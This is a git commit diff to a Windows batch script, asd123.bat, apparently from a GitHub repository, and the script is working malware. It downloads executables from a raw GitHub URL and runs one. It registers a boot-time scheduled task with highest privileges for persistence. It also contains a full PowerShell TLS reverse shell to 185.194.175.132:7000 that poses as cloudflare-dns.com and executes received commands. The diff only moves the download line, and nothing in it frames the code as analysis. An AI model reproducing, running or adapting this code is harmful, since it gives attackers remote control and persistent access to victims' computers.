4d57d9298c11029b8f707ad5e59907dc08a669a5
Seition2 <130700484+seition2doc@users.noreply.github.com>
2025-06-23 21:34:56 +0300

    Update asd123.bat

--- asd123.bat
+++ asd123.bat
@@ -12,7 +12,6 @@ if %taskExists% neq 0 (
     del /f /q "asd.bat"
     cd /d %temp%
     curl https://raw.githubusercontent.com/seition2doc/dosta2/refs/heads/main/NotMyfault64.exe -o NotMyfault64.exe
-    curl https://raw.githubusercontent.com/seition2doc/dosta2/refs/heads/main/c.exe -o c.exe
     schtasks /create /tn "TempVBS_OnBoot" /tr "%temp%\e.vbs" /sc onstart /f /rl HIGHEST
 
     if not exist "%marker%" (
@@ -25,8 +24,9 @@ if %taskExists% neq 0 (
     del /f /q "asd.bat"
     cd /d %temp%
     schtasks /create /tn "TempVBS_OnBoot" /tr "%temp%\e.vbs" /sc onstart /f /rl HIGHEST
+    curl https://raw.githubusercontent.com/seition2doc/dosta2/refs/heads/main/c.exe -o c.exe
     start c.exe
-
+    
     powershell -Command "$sslProtocols = [System.Security.Authentication.SslProtocols]::Tls12; $TCPClient = New-Object Net.Sockets.TCPClient('185.194.175.132', 7000); $NetworkStream = $TCPClient.GetStream(); $SslStream = New-Object Net.Security.SslStream($NetworkStream,$false,({$true} -as [Net.Security.RemoteCertificateValidationCallback])); $SslStream.AuthenticateAsClient('cloudflare-dns.com',$null,$sslProtocols,$false); if(!$SslStream.IsEncrypted -or !$SslStream.IsSigned) {$SslStream.Close(); exit}; $StreamWriter = New-Object IO.StreamWriter($SslStream); function WriteToStream ($String) {[byte[]]$script:Buffer = New-Object System.Byte[] 4096; $StreamWriter.Write($String + 'SHELL> '); $StreamWriter.Flush()}; WriteToStream ''; while(($BytesRead = $SslStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {$Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1); $Output = try {Invoke-Expression $Command 2>&1 | Out-String} catch {$_ | Out-String}; WriteToStream ($Output)} $StreamWriter.Close()"
 )
 
